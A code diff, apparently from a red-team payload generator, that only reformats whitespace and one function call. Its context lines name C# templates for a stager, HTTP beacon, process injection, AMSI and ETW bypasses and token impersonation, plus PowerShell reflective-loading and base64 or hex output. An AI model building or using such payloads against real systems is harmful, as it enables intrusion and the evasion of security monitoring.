@@ -70,7 +70,6 @@ public class LazyStager {{
     }}
 }}
 """,
-
     "http_beacon": r"""
 using System;
 using System.Collections.Generic;
@@ -150,7 +149,6 @@ public class LazyBeacon {{
     }}
 }}
 """,
-
     "process_injection": r"""
 using System;
 using System.Diagnostics;
@@ -184,7 +182,6 @@ public class LazyInject {{
     }}
 }}
 """,
-
     "amsi_bypass": r"""
 using System;
 using System.Runtime.InteropServices;
@@ -211,7 +208,6 @@ public class LazyAmsiBypass {{
     }}
 }}
 """,
-
     "etw_bypass": r"""
 using System;
 using System.Runtime.InteropServices;
@@ -243,7 +239,6 @@ public class LazyEtwBypass {{
     }}
 }}
 """,
-
     "token_impersonation": r"""
 using System;
 using System.Security.Principal;
@@ -538,9 +533,7 @@ Add-Type -TypeDefinition $SourceCode -Language CSharp -ReferencedAssemblies @("S
             escaped = source.replace("\\", "\\\\").replace('"', '\\"')
             return f'source_code = """{source}"""\n\n{escaped}'
         if fmt in ("ps1", "powershell"):
-            return self.generate_powershell_reflective(
-                DotNetPayloadConfig(template_name=data["template"])
-            )
+            return self.generate_powershell_reflective(DotNetPayloadConfig(template_name=data["template"]))
         if fmt in ("base64",):
             return base64.b64encode(source.encode()).decode()
         if fmt in ("hex",):
